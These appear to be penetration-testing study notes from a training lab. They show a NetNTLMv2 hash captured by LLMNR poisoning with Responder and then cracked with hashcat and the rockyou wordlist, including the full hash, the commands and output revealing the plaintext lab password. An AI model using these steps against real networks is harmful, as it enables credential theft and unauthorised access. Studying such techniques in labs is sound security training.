# Password attacks & Cracking

## NTLM password cracking
- `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`
- we got some hash with LLMNR poisoning via responder
```
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:d865666f39a9b532:01D7E2F5B84A3C82CE68D2811DCC234F:0101000000000000003C496FDF67DB013C531659E96BE0D90000000002000800580059003900540001001E00570049004E002D0054004500480059004E0058004B003300520042004C0004003400570049004E002D0054004500480059004E0058004B003300520042004C002E0058005900390054002E004C004F00430041004C000300140058005900390054002E004C004F00430041004C000500140058005900390054002E004C004F00430041004C0007000800003C496FDF67DB01060004000200000008003000300000000000000000000000003000007C27B08691713C851858FE2726C5AC6C4AC39403080EEDB1CE01D156FCE98E3C0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```
- save `backupagent::INLANEFREIGHT:d865666f39a9b532:01D7E2F5B84A3C82CE68D2811DCC234F:0101000000000000003C496FDF67DB013C531659E96BE0D90000000002000800580059003900540001001E00570049004E002D0054004500480059004E0058004B003300520042004C0004003400570049004E002D0054004500480059004E0058004B003300520042004C002E0058005900390054002E004C004F00430041004C000300140058005900390054002E004C004F00430041004C000500140058005900390054002E004C004F00430041004C0007000800003C496FDF67DB01060004000200000008003000300000000000000000000000003000007C27B08691713C851858FE2726C5AC6C4AC39403080EEDB1CE01D156FCE98E3C0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000` in a txt.
- and now run: `.\hashcat.exe -m 5600 -a 0 .\ntlmv2.txt .\rockyou.txt`
- `-m 5600` especifica que es NTLMv2.
`-a 0` indica un ataque de diccionario.
`hashes.txt` es el archivo con el hash NTLMv2.
- `rockyou.txt` es el diccionario de contraseñas.

### Example output:
```
PS C:\Users\Grunt\Desktop\hashcat-6.2.6> .\hashcat.exe -m 5600 -a 0 .\ntlmv2.txt .\rockyou.txt
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3628.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 245 MB

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

BACKUPAGENT::INLANEFREIGHT:d865666f39a9b532:01d7e2f5b84a3c82ce68d2811dcc234f:0101000000000000003c496fdf67db013c531659e96be0d90000000                                                                                                           0002000800580059003900540001001e00570049004e002d0054004500480059004e0058004b003300520042004c0004003400570049004e002d00540045004800590                                                                                                           004e0058004b003300520042004c002e0058005900390054002e004c004f00430041004c000300140058005900390054002e004c004f00430041004c0005001400580                                                                                                           005900390054002e004c004f00430041004c0007000800003c496fdf67db01060004000200000008003000300000000000000000000000003000007c27b08691713c8                                                                                                           851858fe2726c5ac6c4ac39403080eedb1ce01d156fce98e3c0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e0                                                                                                           00310036002e0035002e003200320035000000000000000000:h1backup55

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BACKUPAGENT::INLANEFREIGHT:d865666f39a9b532:01d7e2f...000000
Time.Started.....: Thu Jan 16 08:34:36 2025 (1 sec)
Time.Estimated...: Thu Jan 16 08:34:37 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 13202.6 kH/s (5.06ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8257536/14344384 (57.57%)
Rejected.........: 0/8257536 (0.00%)
Restore.Point....: 7340032/14344384 (51.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ina&alessandro -> estampida02
Hardware.Mon.#1..: Temp: 54c Fan: 36% Util: 26% Core:1408MHz Mem:1742MHz Bus:8

Started: Thu Jan 16 08:34:22 2025
Stopped: Thu Jan 16 08:34:38 2025
PS C:\Users\Grunt\Desktop\hashcat-6.2.6>
```

### About john the ripper
- The truth is that I don't give much importance to john the ripper, it is a very versatile tool but **the power of hashcat is beyond comparison**.